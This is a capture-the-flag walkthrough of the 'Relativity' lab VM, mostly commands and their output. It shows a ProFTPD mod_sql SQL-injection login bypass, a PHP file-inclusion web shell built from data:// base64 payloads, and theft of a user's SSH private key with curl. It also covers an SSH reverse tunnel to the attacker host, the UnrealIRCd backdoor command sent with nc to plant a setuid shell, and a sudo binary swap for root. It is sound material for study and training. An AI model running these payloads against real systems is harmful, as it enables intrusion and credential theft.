https://twitter.com/trbughunters/status/1279768631845494787
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/
https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html

ProFTPD 1.2.8 - 1.2.9 mod_sql, php wrappers data://text/plain;base64, UnrealIRCd

# Scan

└─$ sudo nmap -p- -sV 172.16.16.128      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 18:43 CET
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.10% done
Nmap scan report for 172.16.16.128
Host is up (0.00041s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.8 - 1.2.9
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
MAC Address: 00:0C:29:6A:3B:E0 (VMware)
Service Info: Host: Relativity; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds


# Exploit

<https://www.securityfocus.com/bid/33722/exploit>

## Injection SQL

    %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
    %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; -- -
    %') union select 1,1,uid,gid,homedir,shell from users; -- -


Connection au server FTP

    └─$ ftp 172.16.16.128
    Connected to 172.16.16.128.
    220 Welcome to Relativity FTP (mod_sql)
    Name (172.16.16.128:kali): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
    331 Password required for %').
    Password:1  <== WHY ?
    230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls 
    200 PORT command successful
    150 Opening ASCII mode data connection for file list
    drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
    -rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
    -rw-r--r--   1 root     root          130 Mar  5  2013 index.html
    226 Transfer complete.
    ftp> 


## PHP LFI

    http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=definition.php
    http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=escher.php
    http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=artwork.php

    $ echo '<?php phpinfo(); ?>' | base64
    PD9waHAgcGhwaW5mbygpOyA/Pgo=
    http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==

    $ echo '<?php system($_GET['cmd']); ?>' | base64
    PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
    http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=ls%20-al%20/home

    total 16
    drwxr-xr-x.  4 root  root  4096 Feb 25  2013 .
    dr-xr-xr-x. 18 root  root  4096 Feb 28  2013 ..
    drwx------.  3 jetta jetta 4096 Jul  9  2013 jetta
    drwxr-xr-x.  3 mauk  mauk  4096 Jul  9  2013 mauk



==> script en python ??

Discovery mauk rsa key

    curl 'http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=cat%20/home/mauk/.ssh/id_rsa'



# Post exploit

    └─$ ssh mauk@172.16.16.128 -i key
    [mauk@Relativity ~]$ ls -al
    total 28
    drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 .
    drwxr-xr-x. 4 root root 4096 Feb 25  2013 ..
    -rw-------. 1 mauk mauk   70 Jul  9  2013 .bash_history
    -rw-r--r--. 1 mauk mauk   18 Apr 23  2012 .bash_logout
    -rw-r--r--. 1 mauk mauk  193 Apr 23  2012 .bash_profile
    -rw-r--r--. 1 mauk mauk  124 Apr 23  2012 .bashrc
    drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh
    [mauk@Relativity ~]$ cat .bash_history

    ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
    su -
    exit
    su -


    └─$ 
    [mauk@Relativity ~]$ id
    uid=1001(mauk) gid=1001(mauk) groups=1001(mauk)

    mauk@Relativity ~]$ netstat  -ntulp
    (No info could be read for "-p": geteuid()=1001 but you should be root.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:6667          0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
    tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
    tcp6       0      0 :::80                   :::*                    LISTEN      -                   
    tcp6       0      0 :::22                   :::*                    LISTEN      -                   
    udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
    udp        0      0 0.0.0.0:51305           0.0.0.0:*                           -                   
    udp6       0      0 :::17375                :::*                                -  


    [mauk@Relativity ~]$ cat .bash_history 
    ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
    su -
    exit
    su -
    [mauk@Relativity ~]$ 


## Foward port 6667

    [mauk@Relativity ~]$ ssh-keygen -P "" -f key
    [mauk@Relativity ~]$ ssh -f -N kali@172.16.16.1 -R 6667:127.0.0.1:6667 -i key


Scan port 6667

    └─$ nmap -sV  127.0.0.1 -p6667      
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 09:19 CET
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.000053s latency).

    PORT     STATE SERVICE VERSION
    6667/tcp open  irc     UnrealIRCd
    Service Info: Host: relativity.localdomain

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds


Searchsploit

    searchsploit  -m linux/remote/13853.pl


Gain privileges jetta access

    $ echo "AB; cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh" | nc 127.0.0.1 6667

    [mauk@Relativity ~]$ ls -al /tmp/sh
    -rwsr-xr-x 1 jetta jetta 930496 Nov 16 04:21 /tmp/sh

    [mauk@Relativity ~]$ /tmp/sh -p
    sh-4.2$ id
    uid=1001(mauk) gid=1001(mauk) euid=1002(jetta) groups=1002(jetta),1001(mauk)

Get jetta's UID 


    ```c

    void main() {
        setreuid(geteuid(), getuid());
        setregid(getegid(), getgid());
        system("/bin.bash");
    }

    ```
    sh-4.2$ gcc get.c -o get
    sh-4.2$ id
    uid=1001(mauk) gid=1001(mauk) euid=1002(jetta) groups=1002(jetta),1001(mauk)
    sh-4.2$ ./get 
    [jetta@Relativity tmp]$ id
    uid=1002(jetta) gid=1001(mauk) groups=1002(jetta),1001(mauk)

# Get root

    [jetta@Relativity ~]$ sudo -l
    Matching Defaults entries for jetta on this host:
        requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
        LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
        LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY PATH", env_reset

    User jetta may run the following commands on this host:
        (root) NOPASSWD: /home/jetta/auth_server/auth_server

    [jetta@Relativity ~]$ rm -fr auth_server/
    [jetta@Relativity ~]$ mkdir auth_server
    [jetta@Relativity ~]$ cp /bin/bash auth_server/auth_server
    [jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
    [root@Relativity jetta]# id
    uid=0(root) gid=0(root) groups=0(root)


# Secret

```php

# index.php
$blacklist_include=array("php://");
for ($i=0; $i<count($blacklist_include); $i++){
    if (strpos($_GET['page'],$blacklist_include[$i]) !== false){
        die();
    }
}
$page = $_GET['page'];
include ($page);

```